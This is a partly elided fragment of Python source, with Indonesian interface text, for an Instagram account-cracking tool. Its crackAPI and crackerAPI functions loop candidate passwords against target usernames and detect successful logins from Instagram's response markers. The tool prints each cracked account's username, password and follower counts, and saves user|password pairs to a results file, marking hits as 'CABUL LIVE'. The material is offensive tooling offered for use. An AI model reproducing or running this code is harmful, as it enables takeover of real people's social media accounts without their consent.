...
class instagram:
	...
	def ingfo(self):
		urut = []
		prints(Panel(f"[{bc}!{hapus}] Hasil Cabul Akan Di Simpan Di Dalam Polder Results", padding=(0,4),style=""))
		urut.append(Panel(f"--Ɑ͞ ̶͞ ̶͞ ඩ/[bold green]OK-{day}.txt[/]",padding=(0,4),style=""))
		urut.append(Panel(f"--Ɑ͞ ̶͞ ̶͞ ඩ[bold yellow]CP-{day}.txt[/]",padding=(0,4),style=""))
		self.tol.print(Columns(urut))

	def ifo(self):
		urut = []
		prints(Panel(f" [{bc}+{hapus}] Pilih Metode",style=""))
		urut.append(Panel(f"[[bold cyan]01] METODE V.1[/]",padding=(0,7),style=""))
		urut.append(Panel(f"[[bold cyan]02] METODE V.2[/]",padding=(0,7),style=""))
		self.tol.print(Columns(urut))
	...
	def crackAPI(self,user,pas):
		...
		for pw in pas:
				...
				if 'userId' in str(ncek) or 'href="https://www.secure.instagram.com/accounts/onetap/"' in str(ncek):
	...
	def crackerAPI(self,user,pas):
		...
		warna = random.choice([M, H, K, U, O,])
		sys.stdout.write(f"\r     [+] crack {loop}/{len(internal)} ok:-{H}{len(success)} {N}cp:-{K}{len(checkpoint)}{N}"),sys.stdout.flush()
		try:
			for pw in pas:
				...
				if 'href="https://www.instagram.com/?hl=id"' in str(respon.text) or 'href="https://www.instagram.com/?hl=en"' in str(respon.text):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{H2}✓{P2}] NAMA      : {H2}{nama}                \n{P2}[{H2}✓{P2}] USERNAMA  : {H2}{user}                \n{P2}[{H2}✓{P2}] KATASANDI  : {H2}{pw}                \n{P2}[{H2}✓{P2}] PENGIKUT  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] MENGIKUTI : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] POSTINGAN : {H2}{postingan}',title=f"{H2}CABUL LIVE😍",width=80,padding=(0,4),style=f"{H2}"))
					print("")
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
